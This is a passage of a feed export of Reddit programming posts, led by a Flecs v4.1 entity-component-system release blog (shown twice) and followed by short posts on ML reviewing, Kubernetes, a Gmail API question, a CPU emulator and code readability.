speedup.</p><p>A simple yet effective performance improvement was to force inlining commonly used ECS operations. Compilers use complicated logic to decide which functions should be inlined, and it can be hit or miss on whether they get it right. Since Flecs v4.0.5 performance critical operations now are annotated with <code>__attribute__((always_inline))</code> on clang and gcc.</p><p>This improved performance of operations like  by another 2x.</p><p>I can’t go over every single improvement in detail or this blog post would become way too long, so here’s a short callout to some of the other notable performance improvements:</p><ul><li>Uncached queries are 2–4x faster to create.</li><li>Pipelines run up to 2x faster.</li><li>World creation is 1.4–2.5x faster</li><li>The performance of empty table cleanup has improved up to 5x.</li><li>Change detection overhead has been reduced by 2x for trivial queries</li><li>C++ systems no longer rely on C code to do query iteration. This avoids function pointer indirection, and makes it much easier for the compiler to reason about and inline C++ system code.</li><li>Empty tables are no longer stored separately from normal tables in the component index and query caches. This speeds up spawn performance considerably (don’t have to emit empty table events anymore) and greatly simplifies some of the internals.</li><li>Creating and deleting entities can no longer cause query rematching, which eliminates a source of lag spikes in applications that are heavy users of queries with relationship traversal.</li></ul><p>The ink on the v4.1 release isn’t dry yet but work on the next batch of improvements is already in full swing! Here’s a few things to look forward to in upcoming releases:</p><ul><li>A new storage optimized for asset hierarchies which in early benchmarks has shown to be an order of magnitude faster than the current implementation.</li><li>Performance improvements to the core data structures used in the component index to speed up uncached query iteration.</li><li>New features and performance improvements for Flecs Script and its reactivity implementation.</li><li>The new non-fragmenting component storage has teased out a nice interface for abstracting component storage. Pluggable storages are again on the horizon!</li><li>More robust reflection/explorer support for complex component types (think reflection for map types &amp; inspector support for collections).</li></ul>","contentLength":17579,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lntgg1/flecs_v41_an_entity_component_system_for_cccrust/"},{"title":"Flecs v4.1, an Entity Component System for C/C++/C#/Rust is out!","url":"https://ajmmertens.medium.com/flecs-4-1-is-out-fab4f32e36f6","date":1751241257,"author":"/u/ajmmertens","guid":175479,"unread":true,"content":"<p><a href=\"https://github.com/SanderMertens/flecs\" rel=\"noopener ugc nofollow\" target=\"_blank\">Flecs</a> is an Entity Component System (<a href=\"https://github.com/SanderMertens/ecs-faq\" rel=\"noopener ugc nofollow\" target=\"_blank\">FAQ</a>) for C and C++ that helps with building games, simulations and more. The core features of Flecs are:</p><ul><li>Store data for  in data structures optimized for CPU cache efficiency and composition-first design</li><li>Builtin support for hierarchies, prefabs and more with <a href=\"https://www.flecs.dev/flecs/md_docs_2Relationships.html\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a>which speed up game code and reduce boiler plate</li><li>An <a href=\"https://www.flecs.dev/explorer\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a><a href=\"https://www.flecs.dev/flecs/md_docs_2Quickstart.html#addons]\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a>to profile, visualize, document and debug projects</li></ul><p>Flecs is fully open source and licensed under the MIT license. If you’d like to support the project, consider giving it a ️️⭐️ on the Github page!</p><p>Since v4.0 there have been exciting updates from games that use Flecs!</p><p>Congrats to the Tempest Rising team on the successful release of their game! Command distinct factions in a desperate struggle for power and resources in Tempest Rising — a classic RTS set on Earth after a nuclear war (Unreal Engine 5).</p><h2>Announced: Resistance is Brutal</h2><p>Resistance is Brutal is Vampire Survivors meets Running Man with a bit of Rick and Morty thrown in. Try to survive as you battle the enemy hordes with brutal abilities before going out in a blaze of glory (Unreal Engine 5).</p><h2>Announced: Age of Respair</h2><p>Age of Respair is a medieval strategy castle-builder. Build massive castles with fortifications while managing resources and production chains. Assemble a large army and lay siege to enemy castles. Lead your people and bring respair to your kingdom (Unreal Engine 5).</p><p>You’ve been hired by an elite organization that cooks for gods. Farm, automate, and cook gourmet meals to appease divine beings or face extinction (Unreal Engine 5).</p><p>Ascendant is a large scale open world voxel RPG inspired by Minecraft and Daggerfall. it spawns the player into a procedurally generated landscape with various biomes and features such as cities and ruins. It creates animals and enemies in the map, and you can gather resources, craft them into other ones, and fight enemies with sword, bow, or magic.</p><p>The developer behind this project is also the author of <a href=\"https://vkguide.dev/\" rel=\"noopener ugc nofollow\" target=\"_blank\">vkguide</a>, which is one of the best resources for learning Vulkan. There is a <a href=\"https://vkguide.dev/docs/ascendant\" rel=\"noopener ugc nofollow\" target=\"_blank\">chapter</a> dedicated specifically to Ascendant, make sure to check it out!</p><p>A vampire survivor like game built in Flecs. What’s awesome is that the developer of the game has made its source code available! Check it out here: <a href=\"https://github.com/ptidejteam/ecs-survivors\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://github.com/ptidejteam/ecs-survivors</a></p><p>There are still more projects cooking that I haven’t listed here. If you want to stay up to date on the progress of Flecs projects, check out the <a href=\"https://discord.com/invite/caR2WmY\" rel=\"noopener ugc nofollow\" target=\"_blank\">showcase channel</a> of the Flecs Discord!</p><p>The v4.1 release builds on the new architecture laid out by v4.0 and comes with significant performance improvements across many parts of the library, in addition to new features that are already proving popular with developers.</p><p>Here are some of the most notable performance improvements (as measured by the <a href=\"https://github.com/SanderMertens/ecs_benchmark\" rel=\"noopener ugc nofollow\" target=\"_blank\">Flecs benchmarking suite</a>):</p><ul><li>: 5x faster than v4.0</li><li>: 5x faster than v4.0</li><li>: 5–10x faster than v4.0</li><li>: 1.5–2x faster than v4.0</li><li>: 2–4x faster than v4.0</li><li>: 5–10x faster than v4.0</li><li>: 40x faster than v4.0, 6x faster than v3.2.12</li></ul><p>Flecs now also uses a lot less memory. The minimum footprint of a Flecs world has decreased 5x, and overall RAM consumption can be as much as two times lower depending on the application! Scroll down to the “Performance” section to see how these improvements were achieved.</p><p>As with every release, a lot of effort has gone into testing and bugfixing. Flecs now has 11.000 test cases, an increase of 2500 test cases since v4.0!</p><p>Here’s an overview of the highlights since v4.0:</p><h2>Non-fragmenting components</h2><p>Flecs is an <a rel=\"noopener\" href=\"https://ajmmertens.medium.com/building-an-ecs-2-archetypes-and-vectorization-fe21690805f9\" data-discover=\"true\">archetype-style ECS</a>, which in short means it optimizes the storage at runtime to allow for fast iteration of multiple components at the same time. The tradeoff that comes with this design however is that adding and removing components to entities can be expensive.</p><p>The alternative to archetypes is a sparse set or independent-storage based design. This design has the opposite tradeoff: adding/removing components is cheap, but iterating multiple components at the same time is more expensive.</p><p>Flecs v4.1 is the first* open source ECS that <a href=\"https://www.flecs.dev/flecs/md_docs_2ComponentTraits.html#dontfragment-trait\" rel=\"noopener ugc nofollow\" target=\"_blank\">supports both</a>! Switching between storages is easy, just add the  trait to a component during registration:</p><pre></pre><p><em>* many people have pointed out to me that Bevy ECS has had sparse components for a long time. That’s correct, but adding a sparse component to an entity in Bevy changes its archetype, so they are *not* non-fragmenting!</em></p><h2>Flecs Script improvements</h2><p>Many new features and performance improvements have been added to Flecs Script that allow for the creation of more complex scenes. Here’s an overview of the most notable changes:</p><ul><li>A new (much faster) expression parser</li><li>A new  addon</li><li>Entity name expressions ()</li></ul><p>An example script that uses some of the new features:</p><pre></pre><p>The following scene is constructed entirely from primitive rectangle and box shapes (link to the code below the image):</p><p>Often when working with hierarchies the order in which children are processed is important. This is especially true for UIs, where the order of widgets can determine how they appear on screen.</p><p>Because of how the Flecs storage works internally, the order in which children are iterated can change when components are added or removed. To improve the usability of builtin hierarchies when working with UIs and similar use cases, a new  trait has been introduced:</p><pre></pre><p>An additional operation has been introduced that makes it possible to change the order of children after they have been created:</p><pre></pre><h2>World local component ids</h2><p>A common annoyance when working with multiple Flecs worlds was that if components were shared between worlds, their ids had to match. This could sometimes lead to unexpected and confusing errors, and was not great for developer UX.</p><p>Since v4.0.4 component ids in the C++ API are now fully local to a world, which means that different worlds can have different ids for the same component.</p><h2>get()/try_get() API redesign</h2><p>The C++  APIs have been redesigned to use the following pattern:</p><pre></pre><p>This expresses intent more clearly and can reduce boilerplate as code no longer has to include defensive checks on whether  returns a . It also allows most code to work with references, which many users prefer.</p><p>: this is a breaking change that affects a lot of code. An easy way to migrate is to replace all occurrences of  in a project with .</p><p>A new  API has been added to the C++ API which can be used as an alternative to . The  operation will add a component to an entity if the entity didn’t have it yet, whereas  only assigns existing components and will panic if the entity didn’t have the component yet.</p><p>In addition to expressing intent more clearly,  also guarantees that it will never move entities to different archetypes, which is something that can happen when calling .</p><p>Using  can also significantly improve performance. This is partly because the operation to get an existing component is faster than the operation to ensure that a component exists.</p><p>A larger improvement comes from another optimization, which is that Flecs no longer inserts  commands if there are no  hooks/observers. In applications that use  frequently this can make a huge difference: it cut frame times in half in one of the Flecs demos.</p><p>Some games can have large variations in the number of objects they are simulating. Flecs holds on to memory once it’s been allocated to avoid constantly freeing and reallocating memory. This can however cause a game to use a lot more memory than what is required for the number of objects in a scene.</p><p>Usually this is not a problem. When someone is playing a game it is typically the only thing that’s happening on a machine, so as long we don’t exceed the maximum amount of RAM the ECS is allowed to use we’re good.</p><p>But what if the game is  the only thing that’s running on the machine? Maybe the process is a game server that coexists with other processes on a server. Maybe the application launches other processes, and needs to run in the background until those other processes finish.</p><p>For those scenarios where the simulation still needs to run but with a greatly reduced number of entities, applications can now shrink the world:</p><p>This frees memory where possible by reclaiming memory from arrays, cleaning up unused tables and more.</p><p>In multithreaded applications it can be difficult to know when the ECS world can be accessed safely, especially if you have a large team of developers. A new feature has been added to help track down scenarios where more than one thread is trying to (illegally) access the world:</p><pre></pre><p>When a thread is done it can release the world so others can use it again:</p><pre></pre><p>When releasing the world a thread can choose to lock it for writing. This only allows threads to read the world, and effectively allows threads to write to a world only when they have exclusive access:</p><pre></pre><h2>Performance tracing hooks</h2><p>Flecs now provides hooks for better integration with profiling tools such as <a href=\"https://github.com/wolfpld/tracy\" rel=\"noopener ugc nofollow\" target=\"_blank\">Tracy</a>. This provides fine-grained visibility in how much time different parts of Flecs applications such as observers and systems are performing.</p><p>The new hooks can be set as callbacks on the OS API:</p><pre></pre><p>There is now <a href=\"https://github.com/flecs-hub/traffic\" rel=\"noopener ugc nofollow\" target=\"_blank\">a new Flecs demo</a> that showcases large numbers of objects with complex behavior. The demo is still a work in progress but it‘s already pretty satisfying to look at:</p><p>This project proved to be as much of an exercise in designing ECS components for optimal CPU cache efficiency, as well as coming up with a set of behaviors that keep traffic flowing at all times. I might do a writeup at some point as there’s fun takeaways from both.</p><p>Because such a large part of this release was dedicated to performance improvements, I thought it’d be fun to share a few details on what changed. This will be more technical than these blogs usually are, so if you’re not interested in nitty-gritty details you can safely skip this.</p><p>In “<a rel=\"noopener\" href=\"https://ajmmertens.medium.com/building-an-ecs-1-where-are-my-entities-and-components-63d07c7da742\" data-discover=\"true\">where are my entities and components</a>” I talked about how we can find components on entities using the component index. This allows us to do operations like , which are common and thus performance critical:</p><pre></pre><p>The component index provides us with a general purpose, constant time solution for finding components. In short, it works like this:</p><pre></pre><p>This approach has a big downside: it needs to access at least three distinct memory locations which can easily cause CPU cache misses.</p><p>Flecs v4.0.1 introduced a component lookup array to each table which provides a much more direct path to obtain the component column:</p><pre></pre><p>The size of  is bound to 256 by default to avoid spending too much memory, so if component ids are larger than that we still revert to the old method of going through the component index.</p><p>This simple change sped up  and related operations by 3x!</p><p>Uncached queries use the component index to quickly find all tables that have the components in a query. In v4.1.0 a new bloom filter got introduced that significantly speeds up uncached query evaluation.</p><p>The existing approach uses the component index to match tables. For a  query, the query engine does the following:</p><pre></pre><p>Map lookups are fast enough for many use cases, but they start adding up when they’re done millions of times per second.</p><p>The new bloom filter avoids having to do many of these lookups. A bloom filter is a bit pattern that can tell us one of two things:</p><ul><li>this table  matches the query</li><li>this table  match the query</li></ul><p>Evaluating the bloom filter looks like this and is super fast:</p><pre></pre><p>We can’t use the bloom filter for all queries, as we can’t express things like operators or more advanced query features. Where it can be used though speedups are significant: observer evaluation got faster because the bloom filter in many cases prevented observer query evaluation entirely!</p><h2>Faster flecs::ref validation</h2><p>The  API provides an even faster way to get a component pointer than . It does this by storing a bit of state about the component so that the next time it is fetched we have to do less work. An example:</p><pre></pre><p>Previously this worked by caching the table record (see “faster component lookups”) on the . This was faster than a , but it does require accessing the table record which could cause cache misses.</p><p>A colleague came up with a clever way to prevent having to do this, and speed up the implementation of  by 2x:</p><ul><li>A ref now directly stores a pointer to the component</li><li>It also stores a “table version”</li><li>Whenever something happens that invalidates a component pointer we increase the table version, which is stored in an array in the world:</li></ul><pre></pre><ul><li>When fetching the component, we check the table version in the ref with the table version in the array:</li></ul><pre></pre><p>Note how we’re only accessing the  and  here. Because the latter is likely to be hot in the cache, we avoid the vast majority of cache misses, which greatly speeds up  performance!</p><p>Fun fact:  is now as fast as  was before this optimization!</p><h2>Faster component fetching when iterating cached queries</h2><p>A major factor that determines how fast queries evaluate is how quickly we can fetch the iterated components. Flecs has gone through a number of iterations that progressively sped this up.</p><p>Flecs v4.1 introduces a new change that significantly speeds this up for cached queries, with a mechanism that is very similar to the new mechanism used by !</p><p>In short, the query now caches component pointers for each matched table. If a cached query matches , then for each matched table the cache entry will store a pointer to the  column and to the  column.</p><p>Column pointers can become invalid however if a column is resized. To address this each cache entry stores a table version (just like ) that increases when column pointers change. We then do the exact same thing we did for references to make sure the pointers are still valid before returning them to the application.</p><p>This is super efficient because:</p><ul><li>Table columns rarely grow, so we almost never need to revalidate the cached column pointers.</li><li>Table columns always grow together, which means we can use a single version number to check all columns.</li></ul><p>This change by itself can speed up cached query iteration by 2x, but it’s not the only thing that changed for cached queries:</p><p>Flecs cached queries are packed with features, and over time these increased the size of the cache elements. Things like wildcards, relationship traversal, grouping and sorting all added fields to cache elements. Most queries don’t use these features however, and so these fields just add dead weight to cache elements.</p><p>Another source of inefficiency is that the query cache was based on a linked list. Iterating the query cache meant doing this (pseudo):</p><pre></pre><p>The nice thing about this was that the iteration code could remain entirely agnostic to query features such as grouping and sorting, which just rewired the  pointers of query cache elements.</p><p>Sadly linked lists come with significant performance drawbacks. Combined with a less than optimal allocation strategy for cache elements, iterating this linked list all but guaranteed tons of cache misses.</p><p>Flecs v4.1 completely refactored the query cache to address these issues:</p><ul><li>Queries now use much (3x) smaller cache elements for simple queries</li><li>The linked list has been replaced with an array</li></ul><p>Combined these changes added up to another 2x performance improvement, and a big reduction in query cache size! These improvements also enabled me to write a much simpler iterator function which also accounted for a large part of the speedup.</p><p>A simple yet effective performance improvement was to force inlining commonly used ECS operations. Compilers use complicated logic to decide which functions should be inlined, and it can be hit or miss on whether they get it right. Since Flecs v4.0.5 performance critical operations now are annotated with <code>__attribute__((always_inline))</code> on clang and gcc.</p><p>This improved performance of operations like  by another 2x.</p><p>I can’t go over every single improvement in detail or this blog post would become way too long, so here’s a short callout to some of the other notable performance improvements:</p><ul><li>Uncached queries are 2–4x faster to create.</li><li>Pipelines run up to 2x faster.</li><li>World creation is 1.4–2.5x faster</li><li>The performance of empty table cleanup has improved up to 5x.</li><li>Change detection overhead has been reduced by 2x for trivial queries</li><li>C++ systems no longer rely on C code to do query iteration. This avoids function pointer indirection, and makes it much easier for the compiler to reason about and inline C++ system code.</li><li>Empty tables are no longer stored separately from normal tables in the component index and query caches. This speeds up spawn performance considerably (don’t have to emit empty table events anymore) and greatly simplifies some of the internals.</li><li>Creating and deleting entities can no longer cause query rematching, which eliminates a source of lag spikes in applications that are heavy users of queries with relationship traversal.</li></ul><p>The ink on the v4.1 release isn’t dry yet but work on the next batch of improvements is already in full swing! Here’s a few things to look forward to in upcoming releases:</p><ul><li>A new storage optimized for asset hierarchies which in early benchmarks has shown to be an order of magnitude faster than the current implementation.</li><li>Performance improvements to the core data structures used in the component index to speed up uncached query iteration.</li><li>New features and performance improvements for Flecs Script and its reactivity implementation.</li><li>The new non-fragmenting component storage has teased out a nice interface for abstracting component storage. Pluggable storages are again on the horizon!</li><li>More robust reflection/explorer support for complex component types (think reflection for map types &amp; inspector support for collections).</li></ul>","contentLength":17579,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lntbxt/flecs_v41_an_entity_component_system_for_cccrust/"},{"title":"[P] Code for Fine-Tuning FLUX.1-dev Explained Step by Step With Comments","url":"https://www.reddit.com/r/MachineLearning/comments/1lnt9za/p_code_for_finetuning_flux1dev_explained_step_by/","date":1751241096,"author":"/u/FallMindless3563","guid":176907,"unread":true,"content":"<p>I was having trouble finding a simple, self contained example of Fine-Tuning FLUX.1-dev with explanation of all the components, so I decided to create one. </p><p>There were examples in HuggingFace diffusers <a href=\"https://github.com/huggingface/diffusers/blob/main/examples/dreambooth/train_dreambooth_lora_flux.py\">examples/dreambooth/train_dreambooth_lora_flux.py</a> (which didn't work out of the gate for me) and <a href=\"https://github.com/ostris/ai-toolkit\">AI-Toolkit</a> which worked well, but had way too many nested if-statements to fully see what was going on under the hood. I took inspiration from both, but cleaned up the code so it was easier to read and worked out of the gate.</p><p>The code was written in a <a href=\"https://marimo.io/\">Marimo Notebook</a> which I'm enjoying lately for developing simple training scripts. </p>","contentLength":631,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] How should I respond to reviewers when my model is worse than much larger models?","url":"https://www.reddit.com/r/MachineLearning/comments/1lnsph5/d_how_should_i_respond_to_reviewers_when_my_model/","date":1751239455,"author":"/u/AdministrativeRub484","guid":176656,"unread":true,"content":"<p>I got a review asking to compare my submission paper with more recent models. The models were not even out 3 months before the submission so by ACL rules I should not have to compare them with my model because it is contemporary.</p><p>Nevertheless I have ran comparisons and my model is much much worse... Why? I'm using a model doing the same thing but 32x smaller, used almost 1/10 of the data they used, etc... I am severely resource constrained and cannot compete in terms of scale, but I still think that my paper makes an important contribution that if we were to match the other models scale we would get better results.</p><p>What should I do? Should I report results that show other models are better and risk the reviewers lower their scores? I kinda just want to explain the authors that the scale is completely different and other factors make it a very unfair comparison, but they might just not care...</p><p>I have a 2.5 average score and really wanted to try to raise it to make it at least into findings, but I honestly don't know how to defend against not having as many resources as top labs/unis...</p>","contentLength":1098,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Karpenter NodePool Strategies: Balancing Cost, Reliability & Tradeoffs","url":"https://www.reddit.com/r/kubernetes/comments/1lnsns8/karpenter_nodepool_strategies_balancing_cost/","date":1751239320,"author":"/u/Separate-Welcome7816","guid":175446,"unread":true,"content":"<li><p> Best for stability and predictability, but comes with higher costs. Ideal for critical workloads that cannot afford interruptions or require guaranteed compute availability.</p></li><li><p> Great for cost savings — often 70-90% cheaper than On-Demand. However, the tradeoff is reliability. Spot capacity can be reclaimed by AWS with little warning, which means workloads must be resilient to node terminations.</p></li><li><p><strong>Mixed Strategy (80% Spot / 20% On-Demand)</strong> The sweet spot for many production environments. This setup blends the cost savings of Spot with the fallback reliability of On-Demand. Karpenter can intelligently schedule critical pods on On-Demand nodes and opportunistic workloads on Spot instances, minimizing risk while maximizing savings.</p></li>","contentLength":733,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"\"colormatrix\". A very colored cmatrix close that uses a random array of colors.","url":"https://www.reddit.com/r/linux/comments/1lns8om/colormatrix_a_very_colored_cmatrix_close_that/","date":1751238157,"author":"/u/Beautiful_Crab6670","guid":175447,"unread":true,"content":"<p>Eh...just a little \"something\" I came up with in my free time. It picks a \"true\" random color and use it to draw a drop. Should be compatible with terminals that use true color. So expect a \"puke\" of colors if you use it on such terminal.<a href=\"https://gitlab.com/gee.8ruhs/writteninc/-/raw/main/colormatrix.c\">Click here</a> to grab the code. Then compile it with \"gcc colormatrix.c -o colormatrix -static -O3 -Wall\".</p>","contentLength":341,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"godump - v1.3.0 - New Release","url":"https://i.postimg.cc/FF0k8Fyk/godump.png","date":1751237481,"author":"/u/cmiles777","guid":175428,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1lnrzwx/godump_v130_new_release/"},{"title":"Create Jobs and CronJobs via Ui using kube composer","url":"https://www.reddit.com/r/kubernetes/comments/1lnrofd/create_jobs_and_cronjobs_via_ui_using_kube/","date":1751236623,"author":"/u/same7ammar","guid":175426,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/same7ammar\"> /u/same7ammar </a>","contentLength":33,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"my first open-source project","url":"https://www.reddit.com/r/golang/comments/1lnqgqj/my_first_opensource_project/","date":1751233384,"author":"/u/MoonOwlMage","guid":175429,"unread":true,"content":"<p>Hey all, I've been working on a service monitoring tool called Heimdall and wanted to share it with the community. It's a lightweight service health checker written in pure Go with zero external dependencies. More information you can find in README.</p><p>It is my first project, that I want to be an open-source, so I'm looking forward for your feedback, feature offers and pull requests. It was started as personal project for my job, but I thought, that it can be useful for others.</p><p>p.s project in dev mode, so I'll add more features in future</p>","contentLength":538,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"One-Minute Daily AI News 6/29/2025","url":"https://www.reddit.com/r/artificial/comments/1lnq3vc/oneminute_daily_ai_news_6292025/","date":1751232440,"author":"/u/Excellent-Target-847","guid":176322,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/Excellent-Target-847\"> /u/Excellent-Target-847 </a>","contentLength":43,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"My Adventures with Kubuntu, KVM, Windows 11 Pro and My 2011 Macbook Air","url":"https://www.reddit.com/r/linux/comments/1lnpyo7/my_adventures_with_kubuntu_kvm_windows_11_pro_and/","date":1751232062,"author":"/u/ScubadooX","guid":176324,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"First time token access to gmail is not working","url":"https://www.reddit.com/r/golang/comments/1lnpxqm/first_time_token_access_to_gmail_is_not_working/","date":1751232000,"author":"/u/pepiks","guid":175481,"unread":true,"content":"<p>I tried play with Gmail API using Go. So I follow tutorial:</p><p>I generate JSON file with credits, setup app as suggested, even add scope manually on Google, creds file saved in workdir. When I run app it open URL:</p><p>So then it stuck on code:</p><p><code>func getTokenFromWeb(config *oauth2.Config) *oauth2.Token {</code><strong>authURL := config.AuthCodeURL(\"state-token\", oauth2.AccessTypeOffline)</strong><strong>fmt.Printf(\"Go to the following link in your browser then type the \"+</strong><strong>\"authorization code: \\n%v\\n\", authURL)</strong></p><p><code>if _, err := fmt.Scan(&amp;authCode); err != nil {</code><code>log.Fatalf(\"Unable to read authorization code: %v\", err)</code></p><p><code>tok, err := config.Exchange(context.TODO(), authCode)</code><code>log.Fatalf(\"Unable to retrieve token from web: %v\", err)</code></p><p>Logic seems fine, but it looks like wrong setup URI code to follow. On browser I have buttons with access to scope, but when I agree I got side is unreachable. I use code provided byt Google and I don't know idea how move forward from this point. My access is configuret as Desktop App (the same as in tutorial).</p><p>At the end I want add permision to my app as I do for email client once and after that run app and do stuff like saving attachments, add labels etc.</p>","contentLength":1141,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Recommended DEs that aren't as common","url":"https://www.reddit.com/r/linux/comments/1lnp3u6/recommended_des_that_arent_as_common/","date":1751229924,"author":"/u/emrldgh","guid":175404,"unread":true,"content":"<p>I'd like to know what everyone's recommendation is for a DE/WM that not everyone may know about or often consider. Anything that isn't KDE, GNOME, or any super common WMs like Hyprland or Sway. These may not be considered very common, but I'd like to hear thoughts on Budgie and Cutefish, I was looking at them and they look neat but what do you guys think? What do you use?</p>","contentLength":374,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Review clearly used an LLM, should I report it to AC?","url":"https://www.reddit.com/r/MachineLearning/comments/1lnoqmm/d_review_clearly_used_an_llm_should_i_report_it/","date":1751229015,"author":"/u/AdministrativeRub484","guid":175480,"unread":true,"content":"<p>This review gave me 1.5 in ACL and calls GRPO Generalized Reward Preference Optimization, which is what ChatGPT thinks GRPO is... It also says my work is the first one to use GRPO in my domain while it is not (and we talk about this in the introduction) and says we are missing some specific evaluations, which are present in the appendix and says we did not justify a claim well enough, which is very well known in my domain but when asking ChatGPT about it it says it does not know about it...</p><p>It feels like the reviewer just wanted to give me a bad review and asked an LLM to write a poor review. He clearly did not even check the output because literally everyone knows GRPO stands for Group Relative Policy Optimization...</p><p>Other than reply to the reviewer while pretending I did not know he/she used ChatGPT, what else can I do? My other reviews were both 3, so I really want to get rid of this review if possible...</p>","contentLength":919,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I built a CPU emulator with its own assembler in java","url":"https://github.com/LPC4/Neptune-32","date":1751228373,"author":"/u/ColdRepresentative91","guid":175402,"unread":true,"content":"<p>Over the past few days I’ve been building a custom 32-bit CPU emulator in java that comes with its own assembler and instruction set. I started on the project for fun, and because I wanted to learn more about CPU architecture and compilers.</p><ul><li>32-bit little-endian architecture with 32 general-purpose registers</li><li>Memory-mapped IO, stack and heap, ROM for syscalls, and RAM/VRAM simulation</li><li>Malloc and Free implemented syscalls (not tested properly)</li><li>128×128 RGBA framebuffer + keyboard and console IO devices</li><li>Instruction set includes arithmetic, logic, branches, system calls, and shifts</li><li>Assembler supports labels, immediate values, register addressing, macros, but still expanding</li></ul><p>I’d love to hear what you think about this project: ideas, critiques, or even some features you’d like to see added. Would really appreciate any tips, feedback, or things I could do better.</p>","contentLength":865,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lnohq1/i_built_a_cpu_emulator_with_its_own_assembler_in/"},{"title":"Free App Hidden Gem: Libreoffice - Full Featured Microsoft Office Alternative","url":"https://youtu.be/bhid0z2JUec?feature=shared","date":1751226910,"author":"/u/Putrid_Draft378","guid":175368,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lnnwlf/free_app_hidden_gem_libreoffice_full_featured/"},{"title":"Multus on Multiple Nodes with UDP broadcast","url":"https://www.reddit.com/r/kubernetes/comments/1lnnt1y/multus_on_multiple_nodes_with_udp_broadcast/","date":1751226657,"author":"/u/rickreynoldssf","guid":175360,"unread":true,"content":"<p>Hello. I've been banging my head against my desk trying to setup multus with ipvlan on AKS. I run a multi node cluster. I need to create multiple pods that create a private network <strong>with all pods on the same subnet</strong> and likely , where they will send UDP broadcasts to each other. </p><p>I need to replicate that many times so there's 1-n groups of pods with their private networks. I also need the pods to have the default host network, hence Multus. </p><p>With a single node and macvlan this all works great but with ipvlan and multiple nodes I cannot communicate across the nodes on the private network. </p><p>Are there any examples / tutorials / docs on doing this?</p>","contentLength":647,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Code is skimmed more often than it is written, so it should be clear at a glance","url":"https://jelv.is/blog/Writing-Code-To-Be-Read-at-a-Glance/","date":1751225471,"author":"/u/tikhonjelvis","guid":175365,"unread":true,"content":"<section><p>In software engineering circles, there is a common adage: “code is read more than it is written”. But this is not the whole picture! <strong>Code is skimmed more than it is read.</strong></p><p>We read code more than we write it because we spend more time maintaining than we do writing from scratch. A line of code, once written, still has a long and storied life ahead of it. You write code once and then return to it multiple times, fixing bugs, adding features, refactoring. To do this you have to change the existing code—and to change it you have to read and understand it. Not just you; future programmers will also work on the code, pursuing their own goals, operating under different constraints.</p><p>For every part of the code you need to revisit to in depth, there will be dozens of related parts you’re not touching directly. You need to navigate through the codebase to find relevant code and you need to track surrounding code for context. You don’t have to understand the related parts of code exactly; just what they are supposed to do. You do this not by reading the code in detail—nobody has the time or working memory to keep a whole codebase in their head!—but by scanning through code quickly and getting just the gist.</p><p>This is a multiplicative relationship. Just as you end up reading code multiple times for each time you write it, you end up skimming multiple times for each piece you read.</p><p><strong>Writing code you can understand  is at least as important as writing code that you can read at all.</strong></p></section><div><p>What does writing code that’s easy to read at a glance actually involve? To me, it comes down to thinking about the  of my code. The structure of the code should give you a quick idea of what it’s supposed to do.</p><p>An immediate consequence of caring out the shape of your code is that related code  and unrelated code —regardless of implementation. How your code looks is a key affordance for guiding the reader’s attention without forcing them to read the code in detail.</p><p>Verbose identifiers obscure the shape of your code. This doesn’t mean you should  use verbose names in your code, just that you should be restrained and tasteful. If an identifier comes from far away—a function from a logically distant module, say—giving it a descriptive name can outweigh the downsides.</p><p>As an illustrative—if extreme—example, let’s compare three versions of the same logic. Here’s some Java code using <a href=\"https://docs.oracle.com/javase/8/docs/api/java/math/BigDecimal.html\">BigDecimal</a>:</p><div><pre><code></code></pre></div><p>Java does not have operator overloading. If it did, the code might look like this instead:</p><div><pre><code></code></pre></div><p>Both of these implement the same mathematical formula:</p><p>This is about as simple as a polynomial gets, but even that wasn’t immediately clear from the first version of the code: you’d have to pay attention to read the sequence of named method calls to understand what was going on. The version with overloaded operators is a real contrast, although it still requires more attention than the math notation. If the first snippet is like reading a paragraph, the second snippet is like reading a short sentence and the math notation is like reading a single word.</p><p>With the math notation, we can  tell we’re looking at a polynomial just from the shape. The information we care about for polynomials are the terms; the addition and multiplication holding everything together is more like an implementation detail. The math notation reflects this by visually grouping together the information for each term and using an operator (+) as “punctuation” to pull it together. Addition is part of what makes the polynomial  but, once we know what we’re looking at, it can fade into the background.</p><p>People are naturally good at tracking context. We can see this with natural language all the time: the same word or phrase can have somewhat different—or sometimes radically different—meanings in different contexts, but this is so natural that, once people are used to it, they barely notice. What was the last time you thought about how red wine is actually purple, or that, for programmers, “strings” and “threads” have absolutely nothing to do with each other?</p><p>Context sensitive meanings aren’t free. The way words in natural languages have different meanings (<a href=\"https://en.wikipedia.org/wiki/Polysemy\">polysemy</a>) is a real obstacle for early language acquisition. But part of the reason that polysemy is difficult is that <em>native speakers do not even notice they are relying on it</em>! Once you get comfortable in a language—whether a totally different language, or just the jargon and conventions of a new social group—tracking the meaning of words based on context becomes . 